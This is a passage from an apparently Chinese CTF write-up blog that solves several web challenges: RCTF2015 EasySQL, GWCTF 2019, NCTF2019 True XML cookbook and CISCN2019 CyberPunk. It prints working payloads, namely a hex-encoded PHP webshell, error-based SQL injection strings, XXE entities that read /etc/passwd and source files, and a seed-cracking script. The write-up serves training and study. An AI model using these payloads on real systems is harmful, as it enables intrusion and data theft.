</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/&#39;| |_|php|;|~|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">^|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">+|eval|{|}/i&#34;</span>,$input)){
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// if(preg_match(&#34;/&#39;| |_|=|php/&#34;,$input)){
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;hacker!!!&#39;</span>);
</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $input;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>过滤了eval还有下划线导致一句话木马和许多执行系统命令的函数无法使用，同时过滤了php导致常规的<code>&lt;?php ?&gt;</code>无法写入文件，想到两种方法绕过</p>
<p>方法一：短标签+assert+hex2bin构造一句话木马</p>
<pre tabindex="0"><code>&lt;?=assert(hex2bin(&#34;6576616c28245f524551554553545b277368656c6c275d293b&#34;))?&gt;
即&lt;?=assert(eval($_REQUEST[&#39;shell&#39;]);)?&gt;
</code></pre><p>蚁剑连上找到flag：flag{ba1d16ab-0fef-46cb-977c-3f2aea47a494}</p>
<p>方法二：短标签+反引号执行系统命令并返回结果+%09绕过空格</p>
<pre tabindex="0"><code>&lt;?=`cat%09/flllllll1112222222lag`?&gt;
</code></pre><hr>
<h2 id="rctf2015easysql">[RCTF2015]EasySQL<a hidden class="anchor" aria-hidden="true" href="#rctf2015easysql">#</a></h2>
<p>修改密码处存在报错注入，username是双引号闭合的，注册时进行注入即可，过滤了<code>空格 and or mid left right substring</code>：</p>
<pre tabindex="0"><code>114&#34;||updatexml(1,concat(0x7e,database()),1)#
XPATH syntax error: &#39;~web_sqli&#39;

114&#34;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#
XPATH syntax error: &#39;~article,flag,users&#39;

114&#34;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1)#
XPATH syntax error: &#39;~flag&#39;

114&#34;||updatexml(1,concat(0x7e,(select(flag)from(flag))),1)#
XPATH syntax error: &#39;~RCTF{Good job! But flag not her&#39;

114&#34;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1)#
XPATH syntax error: &#39;~name,pwd,email,real_flag_1s_her&#39;

114&#34;||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;flag&#39;))),1)#
XPATH syntax error: &#39;~flag{6c7b5915-cce7-456b-895e-1c&#39;

114&#34;||updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;flag&#39;)))),1)#
XPATH syntax error: &#39;~}a64df4b619c1-e598-b654-7ecc-51&#39;
</code></pre><p>flag{6c7b5915-cce7-456b-895e-1c916b4fd46a}</p>
<hr>
<h2 id="gwctf-2019枯燥的抽奖">[GWCTF 2019]枯燥的抽奖<a hidden class="anchor" aria-hidden="true" href="#gwctf-2019枯燥的抽奖">#</a></h2>
<p>check.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#这不是抽奖程序的源代码！不许看！
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Content-Type: text/html;charset=utf-8&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;seed&#39;</span>])){
</span></span><span style="display:flex;"><span>$_SESSION[<span style="color:#e6db74">&#39;seed&#39;</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">999999999</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mt_srand</span>($_SESSION[<span style="color:#e6db74">&#39;seed&#39;</span>]);
</span></span><span style="display:flex;"><span>$str_long1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>;
</span></span><span style="display:flex;"><span>$str<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>$len1<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( $i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $len1; $i<span style="color:#f92672">++</span> ){
</span></span><span style="display:flex;"><span>    $str<span style="color:#f92672">.=</span><span style="color:#a6e22e">substr</span>($str_long1, <span style="color:#a6e22e">mt_rand</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">strlen</span>($str_long1) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">1</span>);       
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$str_show <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($str, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p id=&#39;p1&#39;&gt;&#34;</span><span style="color:#f92672">.</span>$str_show<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/p&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;num&#39;</span>])){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#39;num&#39;</span>]<span style="color:#f92672">===</span>$str){<span style="color:#a6e22e">x</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">show_source</span>(<span style="color:#e6db74">&#34;check.php&#34;</span>); 
</span></span></code></pre></div><p>使用php_mt_seed工具，生成该工具参数所需的格式：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>d <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span>
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Z1wu33G2yq&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> c:
</span></span><span style="display:flex;"><span>    output <span style="color:#f92672">+=</span> str(d<span style="color:#f92672">.</span>index(s)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> str(d<span style="color:#f92672">.</span>index(s)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; 0 61 &#39;</span>
</span></span><span style="display:flex;"><span>print(output)
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./php_mt_seed <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">61</span>
</span></span><span style="display:flex;"><span>Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62
</span></span><span style="display:flex;"><span>Version: 3.0.7 to 5.2.0
</span></span><span style="display:flex;"><span>Found 0, trying 0xe0000000 - 0xffffffff, speed 2505.4 Mseeds/s 
</span></span><span style="display:flex;"><span>Version: 5.2.1+
</span></span><span style="display:flex;"><span>Found 0, trying 0x00000000 - 0x0fffffff, speed 0.0 Mseeds/s 
</span></span><span style="display:flex;"><span>seed <span style="color:#f92672">=</span> 0x013e80f3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">12559208</span> <span style="color:#f92672">(</span>PHP 7.1.0+<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Found 1, trying 0xb0000000 - 0xbfffffff, speed 210.6 Mseeds/s
</span></span></code></pre></div><p>根据seed生成20位字符串：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mt_srand</span>(<span style="color:#ae81ff">12559208</span>);
</span></span><span style="display:flex;"><span>$str_long1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>;
</span></span><span style="display:flex;"><span>$str<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>$len1<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( $i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $len1; $i<span style="color:#f92672">++</span> ){
</span></span><span style="display:flex;"><span>    $str<span style="color:#f92672">.=</span><span style="color:#a6e22e">substr</span>($str_long1, <span style="color:#a6e22e">mt_rand</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">strlen</span>($str_long1) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">1</span>);       
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$str_show <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($str, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">20</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $str_show;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Z1wu33G2yq3xInpVgJAj，抽奖，就是那么枯燥且无味，给你flag{5fe58a16-cc68-47aa-9811-a11f87a7b657}</p>
<hr>
<h2 id="nctf2019true-xml-cookbook">[NCTF2019]True XML cookbook<a hidden class="anchor" aria-hidden="true" href="#nctf2019true-xml-cookbook">#</a></h2>
<p>存在XXE外部实体注入漏洞：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE a [
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
</span></span><span style="display:flex;"><span>]&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;user&gt;&lt;username&gt;</span>&amp;file;<span style="color:#f92672">&lt;/username&gt;&lt;password&gt;</span>114514<span style="color:#f92672">&lt;/password&gt;&lt;/user&gt;</span>
</span></span></code></pre></div><p>用php伪协议读取doLogin.php源码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE a [
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&#34;&gt;</span>
</span></span><span style="display:flex;"><span>]&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;user&gt;&lt;username&gt;</span>&amp;file;<span style="color:#f92672">&lt;/username&gt;&lt;password&gt;</span>114514<span style="color:#f92672">&lt;/password&gt;&lt;/user&gt;</span>
</span></span></code></pre></div><p>doLogin.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* autor: c0ny1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">* date: 2018-2-7
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$USERNAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>; <span style="color:#75715e">//账号
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;024b87931a03f738fff6693ce0a78c88&#39;</span>; <span style="color:#75715e">//密码
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$result <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libxml_disable_entity_loader</span>(<span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span>$xmlfile <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;php://input&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>{
</span></span><span style="display:flex;"><span>	$dom <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DOMDocument</span>();
</span></span><span style="display:flex;"><span>	$dom<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">loadXML</span>($xmlfile, <span style="color:#a6e22e">LIBXML_NOENT</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">LIBXML_DTDLOAD</span>);
</span></span><span style="display:flex;"><span>	$creds <span style="color:#f92672">=</span> <span style="color:#a6e22e">simplexml_import_dom</span>($dom);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$username <span style="color:#f92672">=</span> $creds<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span>;
</span></span><span style="display:flex;"><span>	$password <span style="color:#f92672">=</span> $creds<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($username <span style="color:#f92672">==</span> $USERNAME <span style="color:#f92672">&amp;&amp;</span> $password <span style="color:#f92672">==</span> $PASSWORD){
</span></span><span style="display:flex;"><span>		$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#34;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&#34;</span>,<span style="color:#ae81ff">1</span>,$username);
</span></span><span style="display:flex;"><span>	}<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>		$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#34;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&#34;</span>,<span style="color:#ae81ff">0</span>,$username);
</span></span><span style="display:flex;"><span>	}	
</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">Exception</span> $e){
</span></span><span style="display:flex;"><span>	$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#34;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&#34;</span>,<span style="color:#ae81ff">3</span>,$e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getMessage</span>());
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Type: text/html; charset=utf-8&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $result;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>获取/proc/net/fib_trie，探测内网ip：10.244.166.236的C段，爆破得到flag</p>
<hr>
<h2 id="ciscn2019-华北赛区-day1-web5cyberpunk">[CISCN2019 华北赛区 Day1 Web5]CyberPunk<a hidden class="anchor" aria-hidden="true" href="#ciscn2019-华北赛区-day1-web5cyberpunk">#</a></h2>
<p>页面注释有个file，存在文件包含，php伪协议读取源码</p>
<p>index.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;open_basedir&#39;</span>, <span style="color:#e6db74">&#39;/var/www/html/&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// $file = $_GET[&#34;file&#34;];
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$file <span style="color:#f92672">=</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;file&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($file)){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/phar|zip|bzip2|zlib|data|input|%00/i&#34;</span>,$file)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#39;no way!&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">@</span><span style="color:#66d9ef">include</span>($file);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>search.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require_once</span> <span style="color:#e6db74">&#34;config.php&#34;</span>; 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;user_name&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;phone&#34;</span>]))
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>    $pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;</span>;
</span></span><span style="display:flex;"><span>    $user_name <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;user_name&#34;</span>];
</span></span><span style="display:flex;"><span>    $phone <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;phone&#34;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>($pattern,$user_name) <span style="color:#f92672">||</span> <span style="color:#a6e22e">preg_match</span>($pattern,$phone)){ 
</span></span><span style="display:flex;"><span>        $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;no sql inject!&#39;</span>;
</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select * from `user` where `user_name`=&#39;</span><span style="color:#e6db74">{</span>$user_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and `phone`=&#39;</span><span style="color:#e6db74">{</span>$phone<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>        $fetch <span style="color:#f92672">=</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>($sql);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($fetch) <span style="color:#f92672">&amp;&amp;</span> $fetch<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">num_rows</span><span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>        $row <span style="color:#f92672">=</span> $fetch<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetch_assoc</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$row) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;error&#39;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print_r</span>($db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;p&gt;姓名:&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;user_name&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/p&gt;&lt;p&gt;, 电话:&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;phone&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/p&gt;&lt;p&gt;, 地址:&#34;</span><span style="color:#f92672">.</span>$row[<span style="color:#e6db74">&#39;address&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/p&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;未找到订单!&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;信息不全&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>change.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require_once</span> <span style="color:#e6db74">&#34;config.php&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;user_name&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;address&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;phone&#34;</span>]))
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>    $pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;</span>;
</span></span><span style="display:flex;"><span>    $user_name <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;user_name&#34;</span>];
</span></span><span style="display:flex;"><span>    $address <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($_POST[<span style="color:#e6db74">&#34;address&#34;</span>]);
</span></span><span style="display:flex;"><span>    $phone <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;phone&#34;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>($pattern,$user_name) <span style="color:#f92672">||</span> <span style="color:#a6e22e">preg_match</span>($pattern,$phone)){
</span></span><span style="display:flex;"><span>        $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;no sql inject!&#39;</span>;
</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select * from `user` where `user_name`=&#39;</span><span style="color:#e6db74">{</span>$user_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and `phone`=&#39;</span><span style="color:#e6db74">{</span>$phone<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>        $fetch <span style="color:#f92672">=</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>($sql);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($fetch) <span style="color:#f92672">&amp;&amp;</span> $fetch<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">num_rows</span><span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>){
